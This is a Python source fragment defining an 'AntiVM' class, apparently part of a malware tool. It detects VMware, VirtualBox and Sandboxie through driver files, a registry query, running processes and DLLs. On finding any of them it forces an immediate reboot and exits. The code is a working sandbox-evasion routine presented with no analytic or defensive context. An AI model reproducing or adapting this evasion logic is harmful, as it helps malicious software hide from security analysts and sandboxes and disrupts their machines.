class AntiVM:

    def __init__(self):
        self.drivers()
        self.Regcheck()
        self.VMcontrol()

    def drivers(self):
        if os.path.exists("C:\WINDOWS\system32\drivers\vmci.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists("C:\WINDOWS\system32\drivers\vmhgfs.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists("C:\WINDOWS\system32\drivers\vmmouse.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if  os.path.exists("C:\WINDOWS\system32\drivers\vmsci.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists("C:\WINDOWS\system32\drivers\vmusbmouse.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists("C:\WINDOWS\system32\drivers\vmx_svga.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists("C:\WINDOWS\system32\drivers\VBoxMouse.sys"):
            os.system("shutdown /r /t 1")
            os._exit(1)

    def Regcheck(self):
        R = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        R2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
        if R != 1 and R2 != 1:
            os.system("shutdown /r /t 1")
            os._exit(1)

    def VMcontrol(self):    
        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames:
                processList.append(processNames.replace("K\n", "").replace("\n", ""))
        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            os.system("shutdown /r /t 1")
            os._exit(1)      
        if os.path.exists(os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")):
            os.system("shutdown /r /t 1")
            os._exit(1)
        if os.path.exists(os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")):
            os.system("shutdown /r /t 1")
            os._exit(1)
        try:
            ctypes.cdll.LoadLibrary("SbieDll.dll")
            os.system("shutdown /r /t 1")
            os._exit(1)
        except:
            pass